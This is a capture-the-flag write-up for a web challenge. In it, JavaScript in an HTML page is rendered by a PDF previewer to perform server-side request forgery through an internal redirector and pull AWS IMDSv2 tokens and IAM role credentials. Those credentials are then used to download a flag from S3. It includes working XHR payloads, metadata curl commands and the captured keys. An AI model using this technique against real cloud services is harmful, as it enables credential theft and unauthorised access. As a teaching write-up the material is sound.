# Hacking Toolz
**Category: Web**

![main](images/main.png)

A bunch is going on here. Let's try out each feature.

## Exploring the Site
### Cors Redirector
Entering `https://www.google.com` directs us to `http://52.14.108.42/redir.php?url=https%3A%2F%2Fwww.google.com`, and we get slapped with a big `Access Denied` message. Ok, moving on...

### Site Previewer
Entering `https://www.google.com` downloads a PDF file:

![test](images/google-pdf.png)

### Payload Generator
This one was just fun and doesn't generate useful information.

## Release Notes
The site had a link to some release notes up top. Let's take a look at them:

```
=== Hacking Toolz ===

==== Release Notes ====

1.1 01/12/2020

- Okay, so over the christmas break you guys were being nosey, so a couple of fixes
- Redirector : No longer publically accessible, email me and I can add you to the access list.
- Because you guys thought it was funny to grab the sweet paid content
  from S3, we upgraded to instance metadata service version 2.
  No more metadata for you lol!!! 


1.0 12/25/2020

- First Release!
- Tools all working properly!
- To-Add : more toolz!
```

Two takeaways:
- Redirector is disabled. We should try and find a way to get around this.
- The paid content is hidden in S3, and the site owner is using instance metadata service version 2.


## Crafting a Custom PDF
I created a file, `exploit.html`:
```html
<html>
    <h1>hello there</h1>
    <div id="test"></div>
    <script>
        document.getElementById("test").innerHTML = 'test';
    </script>
</html>
```

Created a mini local server to host it:

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Expose it to the world with ngrok:
```
$ ngrok http 8000
Forwarding                     https://971047f21108.ngrok.io -> http://localhost:8000
```

Requesting `https://971047f21108.ngrok.io/exploit.html`, it renders a pdf containing:

![test-pdf](images/test-pdf.png)

Cool. Let's edit the html to test if we can do an SSRF to use the redirector service:

```html
<html>
    <h1>hello there</h1>
    <div id="dynamic"></div>
    <script>
        var url = "http://localhost/redir.php?url=https://www.google.com";
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url, false);
        xhr.send();
        document.getElementById("dynamic").innerHTML = xhr.responseText;
    </script>
</html>
```

Requesting our ngrok server again in the previewer, we get the google homepage rendered! This proves we can make calls to other hosts via the redirector. 

## Accessing The Metadata
The release notes mentioned that "instance metadata service version 2" was being used. Searching this term, I found [this](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) Amazon document explaining how to use the service. 

> To view all categories of instance metadata from within a running instance, use the following URI.

> http://169.254.169.254/latest/meta-data/

> The IP address 169.254.169.254 is a link-local address and is valid only from the instance. 

The doc also says that in order to view the top level metadata for version 2 of the service, we need to do the following:
```sh
[ec2-user ~]$ TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
```

Ok, we need to put together two network requests. One to retrieve a token value, and another to get the metadata with the token. Let's make another iteration of `exploit.html` that can do this:

```html
<html>
    <h1>hello there</h1>
    <div id="tokenResponse"></div>
    <div id="metadataResponse"></div>
    <div id="error"></div>
    <script>
        var tokenUrl  = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
        var metadataURL = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/";
        var xhr  = new XMLHttpRequest();
        var token = '';
        try {
            xhr.open('PUT', tokenUrl, false);
            xhr.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
            xhr.send();
            token = xhr.responseText;
            document.getElementById("tokenResponse").innerHTML = "Token: " + token;

            xhr.open('GET', metadataURL, false);
            xhr.setRequestHeader('X-aws-ec2-metadata-token', token);
            xhr.send();
            document.getElementById("metadataResponse").innerHTML = xhr.responseText;
        } catch(err) {
            document.getElementById('error').innerHTML = err.message;
        }
    </script>
</html>
```

Let's try it:

![metadata](images/metadata-pdf.png)

😎 nice. I explored the metadata folders until I found this interesting one: `meta-data/iam/security-credentials/S3Role`. I changed the `metadataURL` in the HTML file to "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role" (and added some lines to word wrap the output). Let's PDF it:

![password](images/password-pdf.png)

I installed the aws cli, and changed my `~/.aws/credentials` file to include the password information from the PDF:
```
[default]
aws_access_key_id = ASIA5HRVYIWQIQXZD5FC
aws_secret_access_key = NRne2ZtwuCFrlQcd53QDLUDkRxyO6DrHbIjCzdR0
aws_session_token = IQoJb3JpZ2luX2VjENv//////////wEaCXVzLWVhc3QtMiJGMEQCIFd6LuJOjobgZjh3mLzcaNRMfrj3IzYMu/ctp6kSjkXBAiAf6hJRboSfU/d+mdkHH7nPw5keWX56tItL7Hz/Jj0trCq9Awjk//////////8BEAAaDDkwOTU3MjA2NDY3MiIMVOz7BRPs6XGpzw7FKpEDSK1iukNv81xXM9XYweVjL8l6byW/kZRt8W1EAz/wTBhmpyYv7aDg+dz0h5JpMpmz3LvKWSwZ6qFOkMLb2o0QI1JFuUkp8VM4sQN+BuH39M/bvwijoI+5pTiNydLy7RjBZCUvBykEwnxWdAG9wQBHfOnxU3DRH7KHu3fymKNJWkdrHA8O1KX70Ne5uV0azdWxRjOTQLT2kFvpU/RrGMthPu0S2E0digRDUYyzQ5c4PTfq4jO5VLG7UvsGC79NV/hzUY9fe7k7cyUhNjLMDOVjd0ZzLk8D7oIxEx7x8cj2gxSXyQIoKqKiqy9AmhbfOjhH8bN8n+E+e4K/5yoNgqUWFShmzkB04ZoLF3iGgSV1Sx3lWPwWA40/33xOVne0e5L/Q16HkCtR9AmAh0PgY8IYX5OesETg4LRMtP/jMsNXMACu7a+TiIQprIsdQP+g0uQ+yKzC29cTCRqYn2P+39G4TeVbjEGTcQXgSCUeO1Ea2zLiopVJiBuQF3w7ZtsdDnbmrNL7pNJ2ASAmYlVzl5szItcw+9/RgQY67AFwqcUNILHazCUyzuSaXyrxEAZrDuo86CA2DOgneaPXdcZgZy4ZcT5UaZZNLAG0NLkFQBw5WXtLeQ61FEx0x6oSuerMUGpM6R5qaJlpOD0I2dr2eyHh77GiCUfYAKCHl37bMPFHhXBcRNwv0yoKF5fsiuWDV5q4pv8qJSyjbVyxlS/TE6/hztmkYCr/7IqV+SFAceTczkISYdyWMdPco69/mxcuAHwaWwQrMEhfVpUa9GuALJVUINDaNJS/vbeYhE8BCMR4D4JYzhEn67/qUhZ00fRm9usj1kF2P9D+lWq9RYbTQEPwTUMOfg5BTA==
```

```
$ aws s3 ls
2021-01-12 11:37:04 secretdocs

$ aws s3 ls secretdocs
2021-01-12 13:22:24        241 leviathan.txt

$ aws s3 cp s3://secretdocs/leviathan.txt leviathan.txt
download: s3://secretdocs/leviathan.txt to ./leviathan.txt

$ cat leviathan.txt
no sound, once made, is ever truly lost
in electric clouds, all are safely trapped
and with a touch, if we find them
we can recapture those echoes of sad, forgotten wars
long summers, and sweet autumns

flag{cl0udy_with_a_chance_0f_flag5}
```

🎺🎺

